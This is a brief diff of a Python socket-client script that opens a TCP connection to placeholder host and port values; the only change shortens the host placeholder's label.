@@ -1,7 +1,7 @@
 import socket
 import os
 
-host = "[Host IP]"
+host = "[IP]"
 port = [Connection Port]
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as skt:
